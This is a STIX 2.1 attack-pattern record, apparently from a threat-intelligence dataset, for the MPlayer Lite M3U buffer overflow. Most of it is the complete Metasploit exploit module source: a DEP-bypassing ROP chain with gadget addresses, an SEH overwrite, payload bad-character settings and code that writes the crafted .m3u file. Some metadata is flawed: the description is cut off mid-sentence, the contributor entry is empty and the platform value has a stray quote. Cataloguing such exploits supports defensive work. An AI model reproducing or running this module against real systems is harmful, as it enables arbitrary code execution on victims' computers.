{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b90230ff-061f-4f72-8a2b-8f57d746c3f9",
    "created": "2024-08-14T16:38:15.504443Z",
    "modified": "2024-08-14T16:38:15.504447Z",
    "name": "MPlayer Lite M3U Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/mplayer_m3u_bof.rb",
            "external_id": "mplayer_m3u_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.mplayer-ww.com/eng/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MPlayer Lite M3U Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack-based buffer overflow vulnerability in\n        MPlayer Lite r33064, caused by improper bounds checking of an URL entry.\n\n        By persuading the victim to open a specially-crafted .M3U file, specifically by\n        drag-and-dropping it to the player, a remote attacker can execute arbitrary\n        code on the system.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'C4SS!0 and h1ch4m', # Vulnerability discovery and original exploit\n          'Gabor Seljan',      # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'BID', '46926' ],\n          [ 'EDB', '17013' ],\n          [ 'URL', 'http://www.mplayer-ww.com/eng/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\\x20\\x0d\\x0a\\x1a\\x2c\\x2e\\x26\\x2f\\x3a\\x3e\\x3f\\x5c\",\n          'Space'      => 5040\n        },\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3 (DEP Bypass) / MPlayer Lite r33064',\n            {\n              'Offset' => 21,\n              'Ret'    => 0x649a7bbe  # ADD ESP,64C # PPPR [avformat-52.dll]\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-03-19',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u'])\n        ],\n      self.class)\n\n  end\n\n  def junk\n    return rand_text_alpha(4).unpack(\"V\").first\n  end\n\n  def nops\n    return make_nops(4).unpack(\"V\").first\n  end\n\n  def exploit\n\n    # ROP chain generated by mona.py - See corelan.be\n    rop_gadgets =\n    [\n      0x6ad9d85d,  # POP EBP # RETN [avcodec-52.dll]\n      0x10018fc3,  # &CALL ESP [unrar.dll]\n      0x64984a70,  # POP EAX # RETN [avformat-52.dll]\n      0xffffec4f,  # Value to negate, will become 0x00005040\n      0x6b0ce791,  # NEG EAX # RETN [avcodec-52.dll]\n      0x6b063c7d,  # PUSH EAX # POP EBX # POP ESI # POP EDI # RETN [avcodec-52.dll]\n      junk,\n      junk,\n      0x1001d154,  # POP EAX # RETN [unrar.dll]\n      0x77e71210,  # &VirtualProtect() [IAT RPCRT4.dll]\n      0x64987f7f,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [avformat-52.dll]\n      0x6afcdc68,  # XCHG EAX,ESI # RETN [avcodec-52.dll]\n      0x6b02836d,  # POP EAX # RETN [avcodec-52.dll]\n      0xffffffc0,  # Value to negate, will become 0x00000040\n      0x6b0ce791,  # NEG EAX # RETN [avcodec-52.dll]\n      0x6af79d80,  # XCHG EAX,EDX # RETN [avcodec-52.dll]\n      0x1001bad6,  # POP ECX # RETN [unrar.dll]\n      0x649eab48,  # &Writable location [avformat-52.dll]\n      0x6d7c0bb7,  # POP EDI # RETN [swscale-0.dll]\n      0x6b03d722,  # RETN (ROP NOP) [avcodec-52.dll]\n      0x64984a70,  # POP EAX # RETN [avformat-52.dll]\n      nops,\n      0x6d7c57d1   # PUSHAD # RETN [swscale-0.dll]\n    ].flatten.pack('V*')\n\n    sploit =  rand_text_alpha_upper(target['Offset'])\n    sploit << rop_gadgets\n    sploit << payload.encoded\n    sploit << generate_seh_record(target.ret)\n    sploit << rand_text_alpha_upper(1000) # Generate exception\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(\"http://\" + sploit)\n\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2011-03-19",
    "x_mitre_platforms": [
        "win'"
    ]
}